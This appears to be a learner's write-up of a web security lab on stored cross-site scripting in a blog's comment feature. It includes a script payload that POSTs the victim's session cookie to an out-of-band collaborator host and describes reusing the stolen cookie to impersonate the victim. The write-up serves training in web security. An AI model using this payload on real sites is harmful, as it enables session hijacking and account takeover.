*This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.*

Input a test comment to see how the page will respond:
![[Screenshot 2024-05-17 at 9.10.26 AM.png]]
I tried the following payload to see if if exfiltrating the cookie was possible:
`<script>alert(document.cookie)</script>`
This was the result:
![[Screenshot 2024-05-17 at 9.24.38 AM.png]]
I then decided to use Burp's Collaborator to aid me in stealing a user's cookie. I had to store the XSS payload in the comment section, ensuring that once the comment was viewed by the victim, it will 
1. trigger the retrieval and display of the victim's cookie
2. trigger and out-of-band interaction with the Collaborator server to display to me the victim's cookie
I entered the following payload in the comment section:
```
<script>
fetch('https://8oxyne76m10vkx4gw2l20y93wu2mqfe4.oastify.com',{
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
I received the following:
![[Screenshot 2024-05-17 at 11.02.44 AM 2.png]]
I sent the request to login (using invalid credentials) and pasted both the `secret` and `session` cookies in, which solved the lab:
![[Screenshot 2024-05-17 at 11.06.52 AM.png]]
